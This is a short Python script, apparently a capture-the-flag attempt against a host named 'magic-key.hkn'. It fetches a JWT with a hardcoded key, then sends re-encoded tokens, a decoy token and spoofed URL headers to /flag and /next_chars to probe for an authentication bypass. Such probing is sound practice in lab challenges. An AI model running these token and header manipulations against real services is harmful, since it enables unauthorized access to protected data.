#!/usr/bin/env python3
import base64, requests

TARGET = "magic-key.hkn"
KEY = "C%{6bSUAs52sI@$K8Ouk0"
DECOY = "dGhpcyB0b2tlbiBpcyBub3QgZ29vZA"

# 1) Fresh real (non-admin) JWT from keycheck, right now
r = requests.post(f"http://{TARGET}/keycheck", headers={"Content-Type": "text/plain"},
                   data=f"key={KEY}", timeout=5)
real_jwt = r.headers.get("JWT")
print(f"Fresh real JWT: {real_jwt}\n")

def b64(s): return base64.b64encode(s.encode()).decode().rstrip("=")

tests = [
    ("base64(real JWT) as Session-Token + URL:/flag",
     {"Session-Token": b64(real_jwt), "URL": "/flag"}),
    ("base64(real JWT) as Session-Token + URL-Maybe:/flag",
     {"Session-Token": b64(real_jwt), "URL-Maybe": "/flag"}),
    ("decoy Session-Token + real JWT header + URL:/flag",
     {"Session-Token": DECOY, "JWT": real_jwt, "URL": "/flag"}),
    ("decoy Session-Token + real JWT header + URL-Maybe:/flag",
     {"Session-Token": DECOY, "JWT": real_jwt, "URL-Maybe": "/flag"}),
]

for label, headers in tests:
    for path in ("/flag", "/next_chars"):
        params = {"char": "s"} if path == "/next_chars" else None
        resp = requests.get(f"http://{TARGET}{path}", params=params, headers=headers, timeout=5)
        print(f"{label} | {path} -> {resp.status_code}: {resp.text.strip()[:200]}")
    print()
